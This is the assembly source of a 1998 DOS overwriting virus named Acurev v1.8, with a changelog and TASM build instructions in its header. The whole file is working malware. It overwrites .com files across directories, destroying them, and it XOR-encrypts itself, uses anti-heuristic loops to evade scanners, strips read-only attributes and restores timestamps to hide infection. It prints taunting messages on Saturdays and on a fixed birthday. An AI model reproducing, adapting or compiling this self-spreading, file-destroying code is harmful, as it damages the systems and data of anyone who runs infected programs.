; ------------------------------------------------------------------------- ;
;          Acurev v1.8 coded by KilJaeden of the Codebreakers 1998          ;
; ------------------------------------------------------------------------- ;
; Description:                                                              ;
;                                                                           ;
; v1.0 - start with a simple *.com overwritter                              ;
; v1.1 - add XOR encryption ohhh yeah :)                                    ;
; v1.2 - add restoring time/date stamps                                     ;
; v1.3 - now we can infect even read only files! hah!                       ;
; v1.4 - why infect only one directory when you can do many? hehe           ;
; v1.5 - add Anti-Heuristic tricks yehaw!                                   ;
; v1.6 - display a message on girlfriends bday                              ;
; v1.7 - display a different message every saturday                         ;
; v1.8 - make it 666 bytes big hehe                                         ;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm acurev.asm                                            ;
; to link :::::] tlink /t acurev.obj                                        ;
; ------------------------------------------------------------------------- ;

code    segment                         ; name our segment "code"
        assume  cs:code,ds:code         ; assign CS and DS to code
        org     100h                    ; this is a .com file now

start:
        mov     cx,0FFFFh               ; mmmmmmmm anti-heuristics

anti_one:
        jmp     anti_two                ; jump to anti_two
        mov     ax,4c00h                ; terminate program
        call    do_int21                ; terminate this shit

anti_two:
        loop    anti_one                ; loop anti_one heh

;xor_start:
        lea     si,encrypted            ; SI points to encrypted area start
        mov     di,si                   ; mov SI to DI
        mov     cx,finished-encrypted   ; # of bytes in encrypted area
        call    encryption              ; call the encryption routine
        jmp     encrypted               ; jump to start of encrypted area

encryption:
        lodsb                           ; load a byte
        xor     al,byte ptr [decrypt]   ; xor the byte with our key
        stosb                           ; return the byte
        loop    encryption              ; loop until done
        ret                             ; return from call

        decrypt db 0                    ; decryption key value 0

encrypted:
        mov     ah,4eh                  ; find the first file

get:
        xor     cx,cx                   ; cx to 0
        lea     dx,comfile              ; load *.com string
        call    do_int21                ; and get the first .com
        jc      new_dir                 ; no more .com? new dir

        mov     dx,9eh                  ; get the file name info
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to absolutely none
        call    do_int21                ; can infect read only files now!

        mov     ax,3d02h                ; open the file read / write
        mov     dx,9eh                  ; get the file name info
        call    do_int21                ; open it / get file info now
        xchg    bx,ax                   ; move the file info to BX

        mov     ax,5700h                ; get time / date stamps
        call    do_int21                ; get them now
        mov     time,dx                 ; save the value here
        mov     date,cx                 ; and save the value here

        in      al,40h                  ; get a random value from clock
        mov     byte ptr [decrypt],al   ; save the value as our key
        lea     si,encrypted            ; load the start of encrypted area
        lea     di,finished             ; load the end of encrypted area
        mov     cx,finished-encrypted   ; total # of bytes between them
        call    encryption              ; and encrypt them now

        mov     ah,40h                  ; write to file
        mov     cx,encrypted-start      ; total # of bytes to write
        lea     dx,start                ; and start writting from here
        call    do_int21                ; write diz shitz man!

        mov     ah,40h                  ; write to file
        mov     cx,finished-encrypted   ; total # of bytes to write
        lea     dx,finished             ; and write from here
        call    do_int21                ; write it man!

        mov     ax,5701h                ; restore time/date
        mov     dx,time                 ; from this value
        mov     cx,date                 ; and this value
        call    do_int21                ; restore it now

        mov     ah,3eh                  ; close the file
        call    do_int21                ; do it man!

        mov     ah,4fh                  ; find the next file
        jmp     get                     ; and jump back to get

new_dir:
        lea     dx,dot_dot              ; load .. into dx
        mov     ah,3bh                  ; change directories routine
        call    do_int21                ; change the directory
        jnc     encrypted               ; and lets go again baby

;payload1:
        mov     ah,2ah                  ; get the system time
        call    do_int21                ; get the time now
        cmp     dh,07                   ; is it July?
        jne     saturday                ; is it saturday tho?
        cmp     dl,16                   ; is it the 16th?
        jne     saturday                ; nope, skip payload :(

;payload:
        mov     ah,09h                  ; print a message
        lea     dx,bdaymsg              ; load the message
        call    do_int21                ; print the message

saturday:
        mov     ah,2ah                  ; get the system time
        call    do_int21                ; get the time now
        cmp     al,006h                 ; is it saturday?
        jne     end_virus               ; naw, end the virus

;satpload:
        mov     ah,09h                  ; print another message
        lea     dx,satdmsg              ; the saturday message
        call    do_int21                ; print this shit!

end_virus:
        int     20h                     ; end the virus

do_int21:
        int     21h                     ; do the int 21h
        ret                             ; return from call

;data_area:

        satdmsg db '',10,13
                db 'Acurev v1.8 coded by KilJaeden of the Codebreakers on 05/29/98',10,13
                db '',10,13
                db ' --> How Can You Think Freely In The Shadow Of A Church? <--',10,13
                db '      --> You Cannot Sedate, All The Things You Hate <--',10,13
                db '',10,13
                db '                    --> Your Infected <--',10,13,'$'

        bdaymsg db '',10,13
                db '     Happy Birthday Christine Moore *kiss* I''ll be home',10,13
                db '     In less then a month now... June29th, Can''t wait!!',10,13,'$'

        time    dw 0h                   ; some space for the time
        date    dw 0h                   ; some space for the date
        dot_dot db "..",0               ; changeing directories
        comfile db "*.com",0            ; load up *.com hehe
        db 100 dup (90h)                ; make it 666 bytes
        finished label near             ; just a label man
        code    ends                    ; end code segment
        end     start                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ---------> How Can You Think Freely In The Shadow Of A Church? <--------- ;
; ------------------------------------------------------------------------- ;
